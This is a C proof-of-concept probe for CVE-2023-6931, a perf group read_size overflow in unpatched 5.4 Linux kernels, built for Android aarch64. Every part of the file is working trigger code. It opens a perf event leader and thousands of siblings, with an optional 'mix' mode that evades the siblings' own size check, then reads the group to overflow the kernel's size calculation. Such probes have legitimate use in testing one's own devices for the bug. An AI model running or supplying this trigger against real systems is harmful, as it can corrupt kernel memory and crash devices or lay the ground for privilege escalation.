/* CVE-2023-6931 probe: perf group read_size u16 overflow (5.4 without the fix).
 * Build: clang --target=aarch64-linux-android21 -fPIE -pie -O2 perf_overflow.c -o perf_overflow
 * Usage: ./perf_overflow [siblings]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <linux/perf_event.h>

static int perf_open(struct perf_event_attr *a, pid_t pid, int cpu, int group, unsigned long flags) {
    return (int)syscall(241, a, pid, cpu, group, flags);
}

int main(int argc, char **argv) {
    int n = argc > 1 ? atoi(argv[1]) : 3000;
    int mix = argc > 2 && strcmp(argv[2], "mix") == 0;
    struct rlimit rl = {1 << 20, 1 << 20};
    setrlimit(RLIMIT_NOFILE, &rl);

    struct perf_event_attr a;
    memset(&a, 0, sizeof a);
    a.type = PERF_TYPE_SOFTWARE;
    a.size = sizeof a;
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.disabled = 1;
    a.read_format = PERF_FORMAT_GROUP | PERF_FORMAT_ID |
                    PERF_FORMAT_TOTAL_TIME_ENABLED | PERF_FORMAT_TOTAL_TIME_RUNNING;

    errno = 0;
    int leader = perf_open(&a, 0, -1, -1, 0);
    printf("leader=%d errno=%d (%s)\n", leader, errno, strerror(errno));
    if (leader < 0) return 1;

    int made = 0;
    for (int i = 0; i < n; i++) {
        struct perf_event_attr b = a;
        if (mix) b.read_format = 0;   /* siblings pass their own size check */
        errno = 0;
        int fd = perf_open(&b, 0, -1, leader, 0);
        if (fd < 0) {
            printf("sibling %d failed errno=%d (%s)\n", i, errno, strerror(errno));
            break;
        }
        made++;
    }
    printf("siblings=%d\n", made);
    fflush(stdout);

    static char buf[1 << 20];
    errno = 0;
    ssize_t r = read(leader, buf, sizeof buf);
    printf("read -> %zd errno=%d (%s)\n", r, errno, strerror(errno));
    return 0;
}
